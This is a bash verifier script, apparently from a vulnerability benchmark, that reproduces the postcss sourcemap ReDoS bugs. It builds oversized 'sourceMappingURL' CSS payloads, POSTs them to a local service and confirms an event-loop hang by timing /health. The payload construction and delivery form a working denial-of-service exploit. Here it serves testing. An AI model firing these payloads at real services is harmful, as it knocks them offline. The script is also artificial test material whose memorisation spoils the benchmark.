#!/usr/bin/env bash
# verify.sh --seed|--residual — postcss sourcemap ReDoS (CVE-2021-23368 seed /
# CVE-2021-23382 residual). Effect = event-loop hang. Flag token is the
# start-injected PCB_FLAG (planted.flag); only returned if /health hangs.
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

if [[ -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

case "$VERSION" in
  v0) PORT="${PORT_V0_0:-}" ;;
  v1) PORT="${PORT_V1_0:-}" ;;
  v2) PORT="${PORT_V2_0:-}" ;;
  *) PORT="" ;;
esac
if [[ -z "$PORT" ]]; then
  cid="$(docker ps -q -f "name=${COMPOSE_PROJECT_NAME}-${VERSION}-1" | head -1)"
  [[ -n "$cid" ]] && PORT="$(docker inspect -f '{{(index (index .NetworkSettings.Ports "3000/tcp") 0).HostPort}}' "$cid" 2>/dev/null || true)"
fi
if [[ -z "$PORT" ]]; then
  echo "verify: no host port for $VERSION:3000" >&2
  exit 20
fi
BASE="http://127.0.0.1:${PORT}"
PLANTED="$(cat "$WORK_DIR/planted.flag" 2>/dev/null || true)"

if [[ "$MODE" == "--seed" ]]; then
  "$PY" -c "open('$WORK_DIR/payload.css','w').write('a{}/*# sourceMappingURL=' + ' '*90000 + '!')"
else
  "$PY" -c "open('$WORK_DIR/payload.css','w').write('a{}' + '/*# sourceMappingURL='*40000 + '!')"
fi

# Background POSTs keep the event loop busy; client timeout does not abort the regex.
for i in 1 2 3; do
  "$PY" - "$BASE" "$WORK_DIR/payload.css" <<'PY' &
import json, sys, urllib.request
base, path = sys.argv[1], sys.argv[2]
css = open(path, encoding="utf-8").read()
req = urllib.request.Request(
    base + "/process",
    data=json.dumps({"css": css}).encode(),
    headers={"Content-Type": "application/json"},
    method="POST",
)
try:
    urllib.request.urlopen(req, timeout=40)
except Exception:
    pass
PY
done

# Hang = consecutive /health timeouts (same event loop as postcss.parse).
hang=0
for i in $(seq 1 20); do
  code="$(curl -sS -o /dev/null -w '%{http_code}' --max-time 2 "$BASE/health" || echo 000)"
  if [[ "$code" != "200" ]]; then
    hang=$((hang + 1))
  else
    hang=0
  fi
  if [[ "$hang" -ge 2 ]]; then
    break
  fi
  sleep 1
done
wait || true
# Reap background POSTs; do not block on their 40s client timeout.
kill $(jobs -p) 2>/dev/null || true
wait || true

echo "verify: PORT=$PORT mode=$MODE hang=$hang planted_len=${#PLANTED}"
if [[ "$hang" -ge 2 && -n "$PLANTED" && "$PLANTED" == "$RUN_FLAG" ]]; then
  echo "watchdog_status=hang_confirmed"
  exit 0
fi
echo "watchdog_status=no_hang_or_flag_mismatch"
exit 10
